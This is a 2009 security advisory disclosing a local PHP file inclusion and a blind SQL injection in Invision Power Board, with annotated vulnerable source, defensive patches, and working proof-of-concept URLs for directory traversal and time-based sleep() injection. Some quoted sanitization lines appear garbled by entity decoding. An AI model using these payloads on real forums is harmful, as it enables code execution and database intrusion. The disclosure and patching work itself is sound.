@@ -1,0 +1,674 @@
+=============================================
+- Severity: Moderately High
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Invision Power Board <= 3.0.4 Local PHP File Inclusion and SQL Injection
+Invision Power Board <= 2.3.6 SQL Injection
+
+II. BACKGROUND
+-------------------------
+
+Invision Power Board (IPB) is a professional forum system that has been built from the ground up with speed and security in mind, taking advantage of object
+
+oriented code, highly-optimized SQL queries, and the fast PHP engine. A
+
+comprehensive administration control panel is included to help you keep your board running smoothly. Moderators will also enjoy the full range of options available to them via built-in tools and moderators control panel. Members will appreciate the ability to subscribe to topics, send private messages, and
+
+perform a host of other options through the user control panel.
+
+III. INTRODUCTION
+-------------------------
+
+For a good understanding of the vulnerabilities it is necessary to be familiar
+
+with the way IPB handles input data. Below is a quick trace of input
+validation process. The code snippets come from IPB version 3.0.4.
+
+line | file: admin/sources/base/ipsRegistry.php
+352  | static public function init()
+353  | {
+...  |
+...  |
+462  | IPSLib::cleanGlobals( $_GET );
+463  | IPSLib::cleanGlobals( $_POST );
+464  | IPSLib::cleanGlobals( $_COOKIE );
+465  | IPSLib::cleanGlobals( $_REQUEST );
+466  |
+467  | # GET first
+468  | $input = IPSLib::parseIncomingRecursively( $_GET, array() );
+469  |
+470  | # Then overwrite with POST
+
+471 | self::$request = IPSLib::parseIncomingRecursively( $_POST, $input );
+
+...  |
+
+
+The init() function cleans the input data passed via methods like GET, POST or
+
+others at the start of each request to the forum before any of the input
+variables are processed.
+
+Let's look into sanitization performed by cleanGlobals function:
+
+line | file: admin/sources/base/core.php
+1644 | static public function cleanGlobals( &$data, $iteration = 0 )
+1645 | {
+...  |
+1654 |        foreach( $data as $k => $v )
+1655 |        {
+1656 |               if ( is_array( $v ) )
+1657 |               {
+
+1658 | self::cleanGlobals( $data[ $k ], ++ $iteration );
+
+1659 |               }
+1660 |               else
+1661 |               {
+1662 |                       # Null byte characters
+1663 |                       $v = str_replace( chr('0') , '', $v );
+1664 |                       $v = str_replace( "\0"    , '', $v );
+1665 |                       $v = str_replace( "\x00"  , '', $v );
+1666 |                       $v = str_replace( '%00'   , '', $v );
+1667 |
+1668 |                       # File traversal
+
+1669 | $v = str_replace( "../", "../", $v );
+
+1670 |
+1671 |                       $data[ $k ] = $v;
+1672 |               }
+1673 |        }
+1674 | }
+
+
+As we can see the function removes null characters and "../" sequences from
+
+incoming data to prevent unwanted file inclusion.
+
+The next function that affects the input is:
+
+line | file: admin/sources/base/core.php
+
+1573 | static public function parseIncomingRecursively( &$data, $input=array(), $iteration = 0 )
+
+1574 | {
+...  |
+1583 |        foreach( $data as $k => $v )
+1584 |        {
+1585 |                if ( is_array( $v ) )
+1586 |                {
+
+1587 | $input[ $k ] = self::parseIncomingRecursively( $data[ $k ], array(), ++$iteration );
+
+1588 |                }
+1589 |                else
+1590 |                {
+1591 |                        $k = IPSText::parseCleanKey( $k );
+
+1592 | $v = IPSText::parseCleanValue( $v, false );
+
+1593 |
+1594 |                        $input[ $k ] = $v;
+1595 |                }
+1596 |        }
+1597 |
+1598 |        return $input;
+1599 | }
+
+The purpose of this function is to clean the key/value pairs of an array
+
+passed to it with help of the parseCleanKey and parseCleanValue functions. The first one can be skipped as neither of the attacks described later on require
+
+special characters inside variable names. The other looks as follows:
+
+line | file: admin/sources/base/core.php
+4100 | static public function parseCleanValue( $val, $postParse=true )
+4101 | {
+4102 |     if ( $val == "" )
+4103 |     {
+4104 |             return "";
+4105 |     }
+4106 |
+
+4107 | $val = str_replace( " ", " ", IPSText::stripslashes($val) );
+
+4108 |
+4109 |     # Convert all carriage return combos
+
+4110 | $val = str_replace( array( "\r\n", "\n\r", "\r" ), "\n", $val );
+
+4111 |
+4112 |     $val = str_replace( "&", "&", $val );
+4113 |     $val = str_replace( "<!--", "&#60;&#33;--", $val );
+4114 |     $val = str_replace( "-->", "--&#62;", $val );
+4115 |     $val = str_ireplace( "<script", "&#60;script", $val );
+4116 |     $val = str_replace( ">", ">", $val );
+4117 |     $val = str_replace( "<", "<", $val );
+4118 |     $val = str_replace( '"', """, $val );
+
+4119 | $val = str_replace( "\n", "<br />", $val ); // Convert literal newlines
+
+4120 |     $val = str_replace( "$", "$", $val );
+4121 |     $val = str_replace( "!", "!", $val );
+
+4122 | $val = str_replace( "'", "'", $val ); // IMPORTANT: It helps to increase sql query safety.
+
+4123 |
+4124 |     if ( IPS_ALLOW_UNICODE )
+...  |
+
+
+The function cleans input data from characters used typically in XSS and SQL
+
+attacks.
+
+
+The resulting array containing sanitized input data from GET/POST methods is stored in ipsRegistry::$request array (as we can see on the first code
+
+listing).
+
+IV. LOCAL FILE INCLUSION VULNERABILITY
+-------------------------
+
+1. Description.
+
+
+It is possible to include an arbitrary php file stored on the server in any
+
+location (accessible by the php/web server process) by exploiting the
+following code of IPB 3.0.4:
+
+line | file: admin/sources/base/ipsController.php
+142  |public function getCommand( ipsRegistry $registry )
+143  |{
+144  |         $_NOW = IPSDebug::getMemoryDebugFlag();
+145  |
+146  |         $module    = ipsRegistry::$current_module;
+147  |         $section   = ipsRegistry::$current_section;
+
+148 | $filepath = IPSLib::getAppDir( IPS_APP_COMPONENT ) . '/' . self::$modules_dir . '/' . $module . '/';
+
+149  |
+150  |         /* Got a section? */
+151  |         if ( ! $section )
+152  |         {
+
+153 | if ( file_exists( $filepath . 'defaultSection.php' ) )
+
+154  |                 {
+155  |                         $DEFAULT_SECTION = '';
+
+156 | require( $filepath . 'defaultSection.php' );
+
+157  |
+158  |                         if ( $DEFAULT_SECTION )
+159  |                         {
+160  |                                 $section = $DEFAULT_SECTION;
+161  |                         }
+162  |                 }
+163  |         }
+164  |
+
+165 | $classname = self::$class_dir . '_' . IPS_APP_COMPONENT . '_' . $module . '_' . $section;
+
+166  |
+167  |         if ( file_exists( $filepath . 'manualResolver.php' ) )
+168  |         {
+169  |                 require_once( $filepath . 'manualResolver.php' );
+
+170 | $classname = self::$class_dir . '_' . IPS_APP_COMPONENT . '_' . $module . '_manualResolver';
+
+171  |         }
+172  |         else if ( file_exists( $filepath . $section . '.php' ) )
+173  |         {
+174  |                 require_once( $filepath . $section . '.php' );
+175  |         }
+...  |
+
+
+The require_once function on line 174 uses a variable $section to create a
+
+path to a php file that is to be included. The variable is assigned the
+following value:
+
+line  | file: admin/sources/base/ipsRegistry.php
+
+1654 | ipsRegistry::$current_section = ( ipsRegistry:: $request['section'] ) ? ipsRegistry::$request['section'] : '';
+
+which as we know from the introduction comes from a user supplied variable
+
+(via GET or POST method).
+
+
+Although the whole $request array has been filtered out to prevent directory
+
+traversal and arbitrary file inclusion it is possible to evade these
+
+measures due to a bug in a function implementing the "friendly URLs" feature
+
+introduced in version 3.0.0 of the IPB forum.
+
+line | file: admin/sources/base/ipsRegistry.php
+1188 | private static function _fUrlInit()
+1189 | {
+...  |
+1195 |     if ( ipsRegistry::$settings['use_friendly_urls'] )
+1196 |     {
+...  |
+...  |
+
+1235 | $uri = $_SERVER['REQUEST_URI'] ? $_SERVER['REQUEST_URI'] : @getenv('REQUEST_URI');
+
+1236 |
+1237 |         $_toTest = $uri;        //( $qs ) ? $qs : $uri;
+...  |
+...  |
+...  |
+1306 |         //-----------------------------------------
+1307 |         // If using query string furl, extract any
+1308 |         // secondary query string.
+
+1309 | // Ex: http://localhost/index.php?/path/file.html? key=value
+
+1310 |         // Will pull the key=value properly
+1311 |         //-----------------------------------------
+1312 |
+1313 |         if( substr_count( $_toTest, '?' ) > 1 )
+1314 |         {
+
+1315 | $_secondQueryString = substr( $_toTest, strrpos( $_toTest, '?' ) + 1 ); 1316 | $_secondParams = explode( '&', $_secondQueryString );
+
+1317 |
+1318 |                 if( count($_secondParams) )
+1319 |                 {
+1320 |                           foreach( $_secondParams as $_param )
+1321 |                           {
+1322 |                                  list( $k, $v )  = explode( '=', $_param );
+1323 |
+1324 |                                  $k      = IPSText::parseCleanKey( $k );
+1325 |                                  $v      = IPSText::parseCleanValue( $v );
+1326 |
+1327 |                                  $_GET[ $k ]     = $v;
+1328 |                                  $_REQUEST[ $k ] = $v;
+1329 |                                  $_urlBits[ $k ] = $v;
+1330 |
+1331 |                                  ipsRegistry::$request[ $k ]     = $v;
+1332 |                           }
+1333 |                 }
+1334 |         }
+1335 | }
+...  |
+
+The above code allows for a secondary query string from which additional
+
+variables are retrieved and saved in the $request array as well as $_GET and
+
+$_REQUEST globals.
+It takes a query string from a previously not cleaned global:
+
+$_SERVER['REQUEST_URI'] and fails to check if the variables supplied in the
+
+request URI string already exist in any of the arrays as well as to call
+cleanGlobals function to sanitize the values.
+
+
+A variable named 'section' can be passed in the secondary query string in order to bypass filtration of "../" and %00 sequences, effectively allowing to traverse directories and include any given php file within the system leading
+
+to a local file inclusion attack.
+
+
+Note: Omitting '.php' extension (to include arbitrary file like /etc/ passwd)
+
+by using a NULL character will not be possible in this case as a
+
+combination of %00 in the REQUEST_URI will not get decoded by the web server
+
+automatically and there is no urldecode function to decode it before the
+require_once call either.
+
+
+Versions older than 3.0.4 have a different implementation of the friendly url
+
+feature, but are also vulnerable in the same way.
+
+2. Proof of concept.
+
+
+This issue is trivial to exploit with a web browser and a known location of a
+
+php file residing on the target system. Authorisation is not required.
+
+For example, the following URL in case of IPB 3.0.4:
+
+
+http://server-with-ipb-forum-3.0.4.com/forum/index.php?app=core&module=global&section=register&any= ? section = ../../../../../../../../../../../../../../../../../../../../../../../../../../tmp /inc
+
+or the following in case of versions older than IPB 3.0.4:
+
+
+http://server-with-ipb-forum-3.0.[0-3].com/forum/index.php? app=core&module=global&section=register/register/ page__section__ ../../../../../../../../../../../../../../../../../../../../../tmp/inc__
+
+will result in including /tmp/inc.php file and executing code it contains.
+
+V. SQL INJECTION VULNERABILITY
+-------------------------
+
+1. Description.
+
+
+An SQL Injection attack is possible due to an insufficient sanitization in the
+
+following function:
+
+line | file: admin/applications/forums/sources/classes/moderate.php
+1820 | /**
+1821 |  * Create 'where' clause for SQL forum pruning
+1822 |  *
+1823 |  * @access      public
+1824 |  * @return      boolean
+1825 |  */
+
+1826 | public function sqlPruneCreate( $forum_id, $starter_id="", $topic_state="", $post_min="", $date_exp="", $ignore_pin="" )
+
+1827 | {
+1828 |  $sql = 'forum_id=' . intval($forum_id);
+1829 |
+1830 |  if ( intval($date_exp) )
+1831 |  {
+1832 |          $sql .= " AND last_post < {$date_exp}";
+1833 |  }
+1834 |
+1835 |  if ( intval($starter_id) )
+1836 |  {
+1837 |          $sql .= " AND starter_id={$starter_id}";
+1838 |
+1839 |  }
+1840 |
+1841 |  if ( intval($post_min) )
+1842 |  {
+1843 |          $sql .= " AND posts < {$post_min}";
+1844 |  }
+1845 |
+1846 |  if ($topic_state != 'all')
+1847 |  {
+1848 |          if ($topic_state)
+1849 |          {
+1850 |                  $sql .= " AND state='{$topic_state}'";
+1851 |          }
+1852 |  }
+1853 |
+1854 |  if ( $ignore_pin != "" )
+1855 |  {
+1856 |          $sql .= " AND pinned=0";
+1857 |  }
+1858 |
+1859 |
+1860 |  return $sql;
+1861 | }
+
+
+All of the IF statements with intval() are to ensure that the arguments passed to the function are numeric before they are placed inside a WHERE clause of a
+
+query.
+
+Because of the way that intval() works, it is possible to fool the function by passing a string like: '1 OR sleep(5) '. In such case intval() will return a value of 1 thus satisfying the IF conditions and causing the string to be
+
+placed inside the query.
+
+The sqlPruneCreate function is used 2 times in a code that performs some
+moderator's tasks. One invocation of it can be found in:
+
+
+line | file: admin/applications/forums/modules_public/moderate/ moderate.php
+
+2323 | protected function _pruneMove()
+2324 | {
+2325 |  //-----------------------------------------
+2326 |  // Check
+2327 |  //-----------------------------------------
+2328 |
+2329 |  $this->_resetModerator( $this->topic['forum_id'] );
+2330 |
+2331 |  $this->_genericPermissionCheck( 'mass_move' );
+2332 |
+2333 |  ///-----------------------------------------
+2334 |  // SET UP
+2335 |  //-----------------------------------------
+2336 |
+
+2337 | $pergo = intval( $this->request['pergo'] ) ? intval( $this->request['pergo'] ) : 50;
+
+2338 |  $max            = intval( $this->request['max'] );
+2339 |  $current        = intval($this->request['current']);
+2340 |  $maxdone        = $pergo + $current;
+2341 |  $tid_array      = array();
+2342 |  $starter        = trim( $this->request['starter'] );
+2343 |  $state          = trim( $this->request['state'] );
+2344 |  $posts          = intval( $this->request['posts'] );
+2345 |  $dateline       = intval( $this->request['dateline'] );
+2346 |  $source         = $this->forum['id'];
+2347 |  $moveto         = intval($this->request['df']);
+2348 |  $date           = 0;
+2349 |  $ignore_pin     = intval( $this->request['ignore_pin'] );
+2350 |
+2351 |  if( $dateline )
+2352 |  {
+2353 |          $date   = time() - $dateline*60*60*24;
+2354 |  }
+2355 |
+2356 |  //-----------------------------------------
+2357 |  // Carry on...
+2358 |  //-----------------------------------------
+2359 |
+
+2360 | $dbPruneWhere = $this->modLibrary->sqlPruneCreate( $this- >forum['id'], $starter, $state, $posts, $date, $ignore_pin );
+
+2361 |
+2362 |  $this->DB->build( array(
+2363 |                                                          'select'        => 'tid',
+2364 |                                                          'from'          => 'topics',
+2365 |                                                          'where'         => $dbPruneWhere,
+2366 |                                                          'limit'         => array( 0, $pergo ),
+2367 |                                          )               );
+2368 |  $batch  = $this->DB->execute();
+...  |
+
+As we can see there are 2 variables that come from a user and are not
+
+converted to a number before they are passed to the sqlPruneCreate function:
+
+$starter and $state.
+
+The second variable cannot be used in SQL Injection as it will be treated as a string and embraced with quotes by sqlPruneCreate. A string passed in $starter variable will be placed unquoted in the query as long as the first character is a number allowing a logged in moderator to perform an SQL Injection attack.
+
+The vulnerability is somewhat tricky to exploit as there are quite a few
+
+restrictions that make creating a successful sql attack vector difficult. Only the WHERE statement can be controlled, quotes are filtered, and UNION or sub selects are prohibited too (at least in case of a MySQL driver). To top it all, the results of the query are not outputted to the browser so it will have
+
+to be a blind injection.
+
+Nevertheless a crafty attacker might issue a series of requests that might
+
+allow him to gain some information about the target system or even read
+
+files from the disk depending on permissions granted to the db account that is used by the forum. Other attacks might also be possible when a database engine
+
+other than MySQL is used.
+
+2. Proof of concept.
+
+If a logged in user with moderator privileges requests an URL like:
+
+http://server-with-ipb-3.x.x-forum.com/forum/?app=forums&module=moderate&section=moderate&f=1&do=prune_move&df=3&pergo=50&dateline=0&state=open&ignore_pin=1&max=0&starter=1%20AND%20starter_id=1%20OR%20substr(version(),1,1)=5%20AND%20sleep(15)%20--%20skip%20&auth_key=c4276b77602767228faa9760eb4a5abd
+
+in case of IPB 3.x, or:
+
+http://server-with-ipb-2.x.x-forum.com/forum/?act=mod&f=1&CODE=prune_move&df=3&pergo=50&dateline=0&state=open&ignore_pin=1&max=0&starter=1%20AND%20starter_id=1%20OR%20substr(version(),1,1)=5%20AND%20sleep(16)%20--%20skip%20&auth_key=040c4a6e768d626b4c05a4bb0fbf315c
+
+in case of IPB 2.x.
+
+A query similar to:
+
+
+SELECT tid FROM ibftopics WHERE forum_id=1 AND starter_id=1 AND starter_id=1 OR substr(version(),1,1)=5 AND sleep(15) -- skip AND state='open' AND pinned=0
+
+LIMIT 0,50
+
+will be run against the database.
+
+The query will check if a major version of MySQL server is equal to 5. If that is the case a sleep function will be run which will slow down the page load by
+
+15 seconds thus revealing the result of the query.
+
+
+For this to work a valid auth_key needs to be supplied (that can be obtained by going to any of the forums, clicking Forum Management button and selecting Prune/Mass Move feature). Source ($f) and Destination ($df) forums parameters
+
+in the URL might also need adjusting.
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The Local PHP File Inclusion vulnerability can be especially dangerous in a shared hosting environment. Even if server has been configured to prevent
+
+users from reading each other's document roots (web server/PHP process
+
+running in a context of the site's owner), an attacker that has an account on the same server as the targeted site could use the vulnerability to place a php file in a shared directory like /tmp and cause the IPB forum on the target
+
+to execute his code thus gaining access equivalent to the owner of the
+website.
+
+
+The SQL Injection vulnerability is only a threat in case there are moderators
+
+on the forum that cannot be fully trusted or if an attacker manages to
+steal/guess their passwords. Possible risks in case of a successful
+exploitation of this flaw have been described in the previous section.
+
+VII. SYSTEMS AFFECTED
+-------------------------
+
+All of the IPB versions of the 3.x series (including the newest release of
+
+3.0.4) are affected by the Local PHP File Inclusion and SQL Injection
+vulnerabilities.
+
+
+Probably most if not all of IPB releases of the 2.x series (including 2.3.6)
+
+are affected by the SQL Injection vulnerability.
+
+VIII. SOLUTION
+-------------------------
+
+Vendor has been informed about the vulnerabilities and should be releasing
+
+patches soon.
+
+
+I attach 2 patches for the current versions of both 2.x and 3.x series that
+
+can be used as a temporary solution.
+
+IPB 3.0.4 patch:
+
+
+diff -Nprub ipb304/admin/applications/forums/sources/classes/ moderate.php ipb304-patched/admin/applications/forums/sources/classes/ moderate.php --- ipb304/admin/applications/forums/sources/classes/moderate.php 2009-10-08 16:34:50.000000000 +0100 +++ ipb304-patched/admin/applications/forums/sources/classes/ moderate.php 2009-11-29 01:01:49.000000000 +0000
+
+@@ -1829,18 +1829,18 @@ class moderatorLibrary
+
+                if ( intval($date_exp) )
+                {
+-                       $sql .= " AND last_post < {$date_exp}";
++                       $sql .= " AND last_post < ". intval($date_exp);
+                }
+                
+                if ( intval($starter_id) )
+                {
+-                       $sql .= " AND starter_id={$starter_id}";
++                       $sql .= " AND starter_id=". intval($starter_id);
+                        
+                }
+                
+                if ( intval($post_min) )
+                {
+-                       $sql .= " AND posts < {$post_min}";
++                       $sql .= " AND posts < ". intval($post_min);
+                }
+                
+                if ($topic_state != 'all')
+
+diff -Nprub ipb304/admin/sources/base/ipsRegistry.php ipb304-patched/ admin/sources/base/ipsRegistry.php --- ipb304/admin/sources/base/ipsRegistry.php 2009-10-08 16:34:24.000000000 +0100 +++ ipb304-patched/admin/sources/base/ipsRegistry.php 2009-11-29 00:57:13.000000000 +0000
+
+@@ -479,6 +479,9 @@ class ipsRegistry
+                
+
+/* First pass of app set up. Needs to be BEFORE caches and member are set up */
+
+                self::_fUrlInit();
++               IPSLib::cleanGlobals( $_GET );
++               IPSLib::cleanGlobals( $_REQUEST );
++               IPSLib::cleanGlobals( self::$request );
+
+                self::_manageIncomingURLs();
+
+
+IPB 2.3.6 patch:
+
+
+diff -Nprub ipb236/sources/lib/func_mod.php ipb236-patched/sources/lib/ func_mod.php
+
+--- ipb236/sources/lib/func_mod.php     2009-11-29 01:10:13.000000000 +0000
+
++++ ipb236-patched/sources/lib/func_mod.php 2009-11-29 01:19:23.000000000 +0000
+
+@@ -1219,18 +1219,18 @@ class func_mod
+                
+                if ( intval($date_exp) )
+                {
+-                       $sql .= " AND last_post < $date_exp";
++                       $sql .= " AND last_post < ". intval($date_exp);
+                }
+                
+                if ( intval($starter_id) )
+                {
+-                       $sql .= " AND starter_id=$starter_id";
++                       $sql .= " AND starter_id=". intval($starter_id);
+                        
+                }
+                
+                if ( intval($post_min) )
+                {
+-                       $sql .= " AND posts < $post_min";
++                       $sql .= " AND posts < ". intval($post_min);
+                }
+                
+                if ($topic_state != 'all')
+
+
+Apply by going to your forum's directory and running the command:
+patch -p1 < path_to_the_patch
+
+IX. REFERENCES
+-------------------------
+http://www.invisionpower.com/products/board/
+
+X. CREDITS
+-------------------------
+The vulnerabilities have been discovered by Dawid Golunski
+golunski (at) onet (dot) eu
+
+XI. REVISION HISTORY
+-------------------------
+December 4th, 2009: Initial release
+
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with no
+
+warranties or guarantees of fitness of use or otherwise. I accept no
+
+responsibility for any damage caused by the use or misuse of this information. 
